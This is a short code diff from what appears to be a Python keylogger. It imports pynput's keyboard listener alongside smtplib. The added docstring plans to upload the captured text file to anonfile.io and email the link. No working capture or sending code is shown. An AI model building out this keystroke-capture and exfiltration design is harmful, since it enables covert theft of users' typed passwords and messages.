@@ -1,3 +1,9 @@
+"""
+Add masks for special keys
+upload text file to anonfile.io and send the link from there
+
+"""
+
 import pynput
 import smtplib, ssl
 from pynput.keyboard import Key, Listener
